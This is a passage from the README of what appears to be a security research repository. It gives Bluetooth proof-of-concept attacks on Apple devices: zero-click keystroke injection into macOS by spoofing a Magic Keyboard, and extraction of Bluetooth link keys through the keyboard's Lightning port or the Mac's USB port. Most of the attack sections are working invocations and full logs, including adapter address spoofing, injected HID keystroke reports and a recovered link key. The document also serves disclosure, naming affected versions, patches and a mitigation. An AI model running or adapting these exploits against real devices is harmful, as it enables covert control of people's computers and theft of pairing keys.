1&#39;&#xA;[2024-01-07 11:00:13.001]  connected to SDP (L2CAP 1) on target&#xA;[2024-01-07 11:00:13.011]  &#39;NoInputNoOutput&#39; pairing-agent is running&#xA;[2024-01-07 11:00:13.253]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.020]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.020]  connecting to 58:28:39:E6:AE:1C on port 17&#xA;[2024-01-07 11:00:15.296]  SUCCESS! connected on port 17&#xA;[2024-01-07 11:00:15.296]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.296]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.296]  [RX-17] 15&#xA;[2024-01-07 11:00:15.500]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.500]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.501]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.636]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.636]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.638]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.764]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.764]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.766]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.784]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.784]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.785]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.832]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.832]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.833]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:15.880]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:15.880]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:15.881]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:16.160]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:16.160]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:16.161]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:16.300]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:00:16.300]  connecting to HID Interrupt&#xA;[2024-01-07 11:00:16.301]  connecting to 58:28:39:E6:AE:1C on port 19&#xA;[2024-01-07 11:00:16.580]  SUCCESS! connected on port 19&#xA;[2024-01-07 11:00:16.580]  connected to HID Interrupt (L2CAP 19) on target&#xA;[2024-01-07 11:00:16.580]  connecting to HID Control&#xA;[2024-01-07 11:00:16.580]  connecting to 58:28:39:E6:AE:1C on port 17&#xA;[2024-01-07 11:00:16.859]  SUCCESS! connected on port 17&#xA;[2024-01-07 11:00:16.860]  connected to HID Control (L2CAP 17) on target&#xA;[2024-01-07 11:00:16.860]  [RX-17] 4190&#xA;[2024-01-07 11:00:16.860]  [TX-17] 00&#xA;[2024-01-07 11:00:17.110]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.110]  injecting Tab keypresses for 10 seconds&#xA;[2024-01-07 11:00:17.111]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.115]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.170]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.174]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.229]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.233]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.288]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.292]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.347]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.352]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.406]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.410]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.465]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.469]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.524]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.528]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.583]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.587]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.642]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.646]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.701]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.705]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.759]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.764]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.818]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.823]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.877]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.882]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.936]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:17.941]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:17.995]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:18.000]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:18.054]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:18.059]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:18.113]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:00:18.118]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:18.172]  [TX-19] a10100002b000000000000&#xA;...&#xA;[2024-01-07 11:00:27.102]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:00:27.157]  payload has been transmitted; disconnecting Bluetooth HID client&#xA;[2024-01-07 11:00:27.157]  taking &#39;hci1&#39; offline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;macOS Keystroke Injection&lt;/h3&gt; &#xA;&lt;p&gt;When a Mac is attempting to connect to a paired Magic Keyboard over Bluetooth, an attacker can spoof the Magic Keyboard to the Mac, pair a virtual Bluetooth keyboard, and inject keystrokes without user confirmation.&lt;/p&gt; &#xA;&lt;p&gt;This attack has a timing component, where the attacker must connect to the Mac at the precise moment the Mac attempts to connect to the Magic Keyboard.&lt;/p&gt; &#xA;&lt;p&gt;The included PoC fires when a Magic Keyboard is unplugged from its Mac (after e.g. charging or pairing). The PoC uses the Bluetooth SDP service on the Mac as a side-channel to observe the unplug event and trigger the attack. This is a zero-click attack that requires observing a Magic Keyboard get unplugged from a Mac.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;macOS 14 is vulnerable prior to 14.2&lt;/li&gt; &#xA; &lt;li&gt;macOS 13 and 12 are vulnerable with no patch expected&lt;/li&gt; &#xA; &lt;li&gt;macOS 11 and older were not tested&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bluetooth is enabled on the Mac.&lt;/li&gt; &#xA; &lt;li&gt;The Magic Keyboard is powered on and connected the Mac using a Lightning-to-USB cable.&lt;/li&gt; &#xA; &lt;li&gt;The PoC injects keystrokes to open a web browser and perform a Google search. It is also possible to inject keystrokes at the login screen, however this PoC assumes that the Mac is at an active session.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; ./keystroke-injection-macos.py --help&#xA;usage: keystroke-injection-macos.py [-h] -i INTERFACE -t TARGET_ADDRESS -k KEYBOARD_ADDRESS&#xA;&#xA;options:&#xA;  -h, --help            show this help message and exit&#xA;  -i INTERFACE, --interface INTERFACE&#xA;  -t TARGET_ADDRESS, --target_address TARGET_ADDRESS&#xA;  -k KEYBOARD_ADDRESS, --keyboard_address KEYBOARD_ADDRESS&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Invocation&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code&gt;./keystroke-injection-macos.py -i hci1 -t 50:DE:06:A8:E1:CA -k 1C:57:DC:88:55:02&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h5&gt;Output&lt;/h5&gt; &#xA;&lt;pre&gt;&lt;code&gt;[2024-01-07 12:25:43.777]  executing &#39;sudo service bluetooth restart&#39;&#xA;[2024-01-07 12:25:44.324]  configuring Bluetooth adapter&#xA;[2024-01-07 12:25:44.461]  executing &#39;sudo hciconfig hci1 name Hi, My Name is Keyboard&#39;&#xA;[2024-01-07 12:25:44.474]  executing &#39;hciconfig hci1 name&#39;&#xA;[2024-01-07 12:25:44.493]  executing &#39;sudo hciconfig hci1 class 0x002540&#39;&#xA;[2024-01-07 12:25:44.506]  executing &#39;hciconfig hci1 class&#39;&#xA;[2024-01-07 12:25:44.509]  executing &#39;sudo bdaddr -i hci1 1C:57:DC:88:55:02&#39;&#xA;[2024-01-07 12:25:44.649]  executing &#39;hciconfig hci1&#39;&#xA;[2024-01-07 12:25:44.652]  connecting to SDP&#xA;[2024-01-07 12:25:44.652]  connecting to 50:DE:06:A8:E1:CA on port 1&#xA;[2024-01-07 12:25:45.776]  SUCCESS! connected on port 1&#xA;[2024-01-07 12:25:45.776]  executing &#39;sudo btmgmt --index hci1 io-cap 1&#39;&#xA;[2024-01-07 12:25:45.788]  executing &#39;sudo btmgmt --index hci1 ssp 1&#39;&#xA;[2024-01-07 12:25:45.795]  connected to SDP (L2CAP 1) on target&#xA;[2024-01-07 12:25:45.795]  &#xA;&#xA;----------------------------------------------------------------&#xA;| Unplug the Magic Keyboard from the Mac to trigger the attack |&#xA;----------------------------------------------------------------&#xA;&#xA;[2024-01-07 12:25:46.014]  b&#39;HCI sniffer - Bluetooth packet analyzer ver 5.64\n&#39;&#xA;[2024-01-07 12:25:46.015]  b&#39;device: hci1 snap_len: 1500 filter: 0xffffffffffffffff\n&#39;&#xA;[2024-01-07 12:25:46.017]  b&#39;&amp;gt; HCI Event: Number of Completed Packets (0x13) plen 5\n&#39;&#xA;[2024-01-07 12:25:46.018]  b&#39;    handle 11 packets 1\n&#39;&#xA;[2024-01-07 12:25:47.296]  b&#39;&amp;gt; ACL data: handle 11 flags 0x02 dlen 12\n&#39;&#xA;[2024-01-07 12:25:47.297]  b&#39;    L2CAP(s): Connect req: psm 1 scid 0x0506\n&#39;&#xA;[2024-01-07 12:25:47.337]  connecting to HID Control&#xA;[2024-01-07 12:25:47.337]  connecting to 50:DE:06:A8:E1:CA on port 17&#xA;[2024-01-07 12:25:47.788]  ERROR connecting on port 17: [Errno 22] Invalid argument&#xA;[2024-01-07 12:25:47.788]  connecting to HID Control&#xA;[2024-01-07 12:25:47.799]  connecting to 50:DE:06:A8:E1:CA on port 17&#xA;[2024-01-07 12:25:47.908]  SUCCESS! connected on port 17&#xA;[2024-01-07 12:25:47.908]  connected to HID Control (L2CAP 17) on target&#xA;[2024-01-07 12:25:47.908]  connecting to HID Interrupt&#xA;[2024-01-07 12:25:47.908]  connecting to 50:DE:06:A8:E1:CA on port 19&#xA;[2024-01-07 12:25:47.976]  SUCCESS! connected on port 19&#xA;[2024-01-07 12:25:47.976]  connected to HID Interrupt (L2CAP 19) on target&#xA;[2024-01-07 12:25:47.976]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.012]  [RX-17] 71&#xA;[2024-01-07 12:25:48.013]  [TX-17] 00&#xA;[2024-01-07 12:25:48.048]  [RX-17] 53c601180121&#xA;[2024-01-07 12:25:48.048]  [TX-17] 00&#xA;[2024-01-07 12:25:48.084]  [RX-17] 53ffbb&#xA;[2024-01-07 12:25:48.084]  [TX-17] 00&#xA;[2024-01-07 12:25:48.116]  [RX-17] 43f0&#xA;[2024-01-07 12:25:48.116]  [TX-17] 00&#xA;[2024-01-07 12:25:48.159]  [RX-17] 53ff90&#xA;[2024-01-07 12:25:48.160]  [TX-17] 00&#xA;[2024-01-07 12:25:48.192]  [RX-17] 41f0&#xA;[2024-01-07 12:25:48.192]  [TX-17] 00&#xA;[2024-01-07 12:25:48.228]  [RX-17] 53ff34&#xA;[2024-01-07 12:25:48.228]  [TX-17] 00&#xA;[2024-01-07 12:25:48.265]  [RX-17] 43f0&#xA;[2024-01-07 12:25:48.265]  [TX-17] 00&#xA;[2024-01-07 12:25:48.296]  [RX-17] 53ff90&#xA;[2024-01-07 12:25:48.296]  [TX-17] 00&#xA;[2024-01-07 12:25:48.308]  [RX-17] 41f0&#xA;[2024-01-07 12:25:48.309]  [TX-17] 00&#xA;[2024-01-07 12:25:48.344]  [RX-17] 53ffe0&#xA;[2024-01-07 12:25:48.344]  [TX-17] 00&#xA;[2024-01-07 12:25:48.376]  [RX-17] 43f0&#xA;[2024-01-07 12:25:48.376]  [TX-17] 00&#xA;[2024-01-07 12:25:48.413]  [RX-17] 53ff14&#xA;[2024-01-07 12:25:48.413]  [TX-17] 00&#xA;[2024-01-07 12:25:48.456]  [RX-17] 43f0&#xA;[2024-01-07 12:25:48.456]  [TX-17] 00&#xA;[2024-01-07 12:25:48.492]  [RX-17] 53ffc5&#xA;[2024-01-07 12:25:48.493]  [TX-17] 00&#xA;[2024-01-07 12:25:48.528]  [RX-17] 43f0&#xA;[2024-01-07 12:25:48.528]  [TX-17] 00&#xA;[2024-01-07 12:25:48.572]  [RX-17] 53ff02&#xA;[2024-01-07 12:25:48.573]  [TX-17] 00&#xA;[2024-01-07 12:25:48.607]  [RX-17] 43f1&#xA;[2024-01-07 12:25:48.608]  [TX-17] 00&#xA;[2024-01-07 12:25:48.644]  [RX-19] a2f10100&#xA;[2024-01-07 12:25:48.645]  injecting payload&#xA;[2024-01-07 12:25:48.645]  [TX-19] a1010800e32c0000000000&#xA;[2024-01-07 12:25:48.646]  [RX-19] a2f10100&#xA;[2024-01-07 12:25:48.647]  [RX-19] a2f10100&#xA;[2024-01-07 12:25:48.649]  [RX-19] a2f10100&#xA;[2024-01-07 12:25:48.650]  [RX-19] a2f10100&#xA;[2024-01-07 12:25:48.653]  [RX-17] 53ff03&#xA;[2024-01-07 12:25:48.653]  [TX-17] 00&#xA;[2024-01-07 12:25:48.680]  [RX-17] 43f1&#xA;[2024-01-07 12:25:48.680]  [TX-17] 00&#xA;[2024-01-07 12:25:48.896]  [TX-19] a101000017000000000000&#xA;[2024-01-07 12:25:48.900]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.905]  [TX-19] a101000008000000000000&#xA;[2024-01-07 12:25:48.909]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.914]  [TX-19] a101000015000000000000&#xA;[2024-01-07 12:25:48.918]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.922]  [TX-19] a101000010000000000000&#xA;[2024-01-07 12:25:48.927]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.931]  [TX-19] a10100000c000000000000&#xA;[2024-01-07 12:25:48.936]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.940]  [TX-19] a101000011000000000000&#xA;[2024-01-07 12:25:48.944]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.949]  [TX-19] a101000004000000000000&#xA;[2024-01-07 12:25:48.953]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.958]  [TX-19] a10100000f000000000000&#xA;[2024-01-07 12:25:48.962]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:48.966]  [TX-19] a101000028000000000000&#xA;[2024-01-07 12:25:48.971]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.225]  [TX-19] a101010006e00000000000&#xA;[2024-01-07 12:25:49.230]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.234]  [TX-19] a101000012000000000000&#xA;[2024-01-07 12:25:49.239]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.244]  [TX-19] a101000013000000000000&#xA;[2024-01-07 12:25:49.248]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.252]  [TX-19] a101000008000000000000&#xA;[2024-01-07 12:25:49.256]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.261]  [TX-19] a101000011000000000000&#xA;[2024-01-07 12:25:49.265]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.269]  [TX-19] a10100002c000000000000&#xA;[2024-01-07 12:25:49.274]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.278]  [TX-19] a101020034e10000000000&#xA;[2024-01-07 12:25:49.283]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.287]  [TX-19] a10100000b000000000000&#xA;[2024-01-07 12:25:49.291]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.296]  [TX-19] a101000017000000000000&#xA;[2024-01-07 12:25:49.300]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.304]  [TX-19] a101000017000000000000&#xA;[2024-01-07 12:25:49.309]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.313]  [TX-19] a101000013000000000000&#xA;[2024-01-07 12:25:49.318]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.322]  [TX-19] a101000016000000000000&#xA;[2024-01-07 12:25:49.327]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.331]  [TX-19] a101020033e10000000000&#xA;[2024-01-07 12:25:49.335]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.340]  [TX-19] a101000038000000000000&#xA;[2024-01-07 12:25:49.344]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.349]  [TX-19] a101000038000000000000&#xA;[2024-01-07 12:25:49.353]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.358]  [TX-19] a10100000a000000000000&#xA;[2024-01-07 12:25:49.362]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.367]  [TX-19] a101000012000000000000&#xA;[2024-01-07 12:25:49.371]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.376]  [TX-19] a101000012000000000000&#xA;[2024-01-07 12:25:49.380]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.385]  [TX-19] a10100000a000000000000&#xA;[2024-01-07 12:25:49.389]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.393]  [TX-19] a10100000f000000000000&#xA;[2024-01-07 12:25:49.398]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.402]  [TX-19] a101000008000000000000&#xA;[2024-01-07 12:25:49.407]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.411]  [TX-19] a101000037000000000000&#xA;[2024-01-07 12:25:49.416]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.420]  [TX-19] a101000006000000000000&#xA;[2024-01-07 12:25:49.424]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.429]  [TX-19] a101000012000000000000&#xA;[2024-01-07 12:25:49.433]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.438]  [TX-19] a101000010000000000000&#xA;[2024-01-07 12:25:49.442]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.447]  [TX-19] a101000038000000000000&#xA;[2024-01-07 12:25:49.451]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.455]  [TX-19] a101000016000000000000&#xA;[2024-01-07 12:25:49.460]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.464]  [TX-19] a101000008000000000000&#xA;[2024-01-07 12:25:49.468]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.473]  [TX-19] a101000004000000000000&#xA;[2024-01-07 12:25:49.477]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.482]  [TX-19] a101000015000000000000&#xA;[2024-01-07 12:25:49.486]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.491]  [TX-19] a101000006000000000000&#xA;[2024-01-07 12:25:49.495]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.499]  [TX-19] a10100000b000000000000&#xA;[2024-01-07 12:25:49.504]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.508]  [TX-19] a101020038e10000000000&#xA;[2024-01-07 12:25:49.513]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.517]  [TX-19] a101000014000000000000&#xA;[2024-01-07 12:25:49.522]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.526]  [TX-19] a10100002e000000000000&#xA;[2024-01-07 12:25:49.531]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.535]  [TX-19] a101000017000000000000&#xA;[2024-01-07 12:25:49.540]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.544]  [TX-19] a10100000b000000000000&#xA;[2024-01-07 12:25:49.549]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.553]  [TX-19] a10100000c000000000000&#xA;[2024-01-07 12:25:49.558]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.562]  [TX-19] a101000016000000000000&#xA;[2024-01-07 12:25:49.567]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.571]  [TX-19] a10102002ee10000000000&#xA;[2024-01-07 12:25:49.576]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.580]  [TX-19] a10100000c000000000000&#xA;[2024-01-07 12:25:49.585]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.589]  [TX-19] a101000016000000000000&#xA;[2024-01-07 12:25:49.593]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.598]  [TX-19] a10102002ee10000000000&#xA;[2024-01-07 12:25:49.602]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.607]  [TX-19] a101000009000000000000&#xA;[2024-01-07 12:25:49.611]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.616]  [TX-19] a10100000c000000000000&#xA;[2024-01-07 12:25:49.620]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.625]  [TX-19] a101000011000000000000&#xA;[2024-01-07 12:25:49.629]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.633]  [TX-19] a101000008000000000000&#xA;[2024-01-07 12:25:49.638]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.642]  [TX-19] a101020034e10000000000&#xA;[2024-01-07 12:25:49.646]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.651]  [TX-19] a101000028000000000000&#xA;[2024-01-07 12:25:49.655]  [TX-19] a101000000000000000000&#xA;[2024-01-07 12:25:49.760]  payload has been transmitted; disconnecting Bluetooth HID client&#xA;[2024-01-07 12:25:49.761]  taking &#39;hci1&#39; offline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Link Key Extraction&lt;/h2&gt; &#xA;&lt;h3&gt;Magic Keyboard Link Key via Lightning Port&lt;/h3&gt; &#xA;&lt;p&gt;When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.&lt;/p&gt; &#xA;&lt;p&gt;The link key remains in memory until the Magic Keyboard is powered off, and can be read by an attacker with access to the lightning port on the keyboard.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;p&gt;Apple started rolling out &lt;a href=&#34;https://support.apple.com/en-us/HT214050&#34;&gt;Magic Keyboard patches&lt;/a&gt; on 2024-01-09.&lt;/p&gt; &#xA;&lt;p&gt;The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Product Name&lt;/th&gt; &#xA;   &lt;th&gt;Model Number&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard&lt;/td&gt; &#xA;   &lt;td&gt;A2450&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Touch ID&lt;/td&gt; &#xA;   &lt;td&gt;A2449&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Numeric Keypad&lt;/td&gt; &#xA;   &lt;td&gt;A1843&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Touch ID and Numeric Keypad&lt;/td&gt; &#xA;   &lt;td&gt;A2520&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Mouse&lt;/td&gt; &#xA;   &lt;td&gt;A1657&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Magic Keyboard has remained powered on since it was last plugged into the Mac&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;p&gt;Plug the Magic Keyboard into the Linux computer with a Lightning-to-USB cable and run the script with no parameters.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./read-link-key-lightning.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;Output&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;Model          - Magic Keyboard&#xA;Serial Number  - F1T2107RUNW12NXA9&#xA;BT Address     - 1c:57:fc:08:65:12&#xA;Mac BT Address - a4:c3:99:e8:a8:6c&#xA;BT Link Key    - c95e3ec98809f2745d32029e7f97b67e&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Magic Keyboard Link Key via USB Port on Mac&lt;/h3&gt; &#xA;&lt;p&gt;When the Magic Keyboard is plugged into the Mac, the Mac sends the Bluetooth link key to the Magic Keyboard over USB.&lt;/p&gt; &#xA;&lt;p&gt;The next time the Magic Keyboard is plugged into the Mac, it is recognized by its Bluetooth address and serial number, and the Mac sends the original link key to the Magic Keyboard.&lt;/p&gt; &#xA;&lt;p&gt;If an attacker knows the Bluetooth address and serial number of a target Magic Keyboard, they can spoof the Magic Keyboard to the Mac over USB, and read the target link key from the USB port on the Mac.&lt;/p&gt; &#xA;&lt;p&gt;The PoC implements this attack by writing the target Bluetooth address and serial number to a donor keyboard, plugging the donor keyboard into the Mac, and then reading the link key off of the donor keyboard.&lt;/p&gt; &#xA;&lt;p&gt;This attack can be mitigated my enabling Lockdown Mode on the Mac.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;p&gt;Apple started rolling out &lt;a href=&#34;https://support.apple.com/en-us/HT214050&#34;&gt;Magic Keyboard patches&lt;/a&gt; on 2024-01-09.&lt;/p&gt; &#xA;&lt;p&gt;macOS versions 12, 13 and 14 were tested and found to be vulnerable to this attack. Earlier versions of macOS were not tested.&lt;/p&gt; &#xA;&lt;p&gt;The following Apple peripherals were tested and found vulnerable to this attack. No other peripherals were tested, so this list may be incomplete.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Product Name&lt;/th&gt; &#xA;   &lt;th&gt;Model Number&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard&lt;/td&gt; &#xA;   &lt;td&gt;A2450&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Touch ID&lt;/td&gt; &#xA;   &lt;td&gt;A2449&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Numeric Keypad&lt;/td&gt; &#xA;   &lt;td&gt;A1843&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Keyboard with Touch ID and Numeric Keypad&lt;/td&gt; &#xA;   &lt;td&gt;A2520&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;Magic Mouse&lt;/td&gt; &#xA;   &lt;td&gt;A1657&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Magic Keyboard is paired with a Mac that does not have Lockdown Mode enabled&lt;/li&gt; &#xA; &lt;li&gt;The attacker knows the Bluetooth address and serial number of the Magic Keyboard&lt;/li&gt; &#xA; &lt;li&gt;The attacker as a donor Magic Keyboard (which will be temporarily 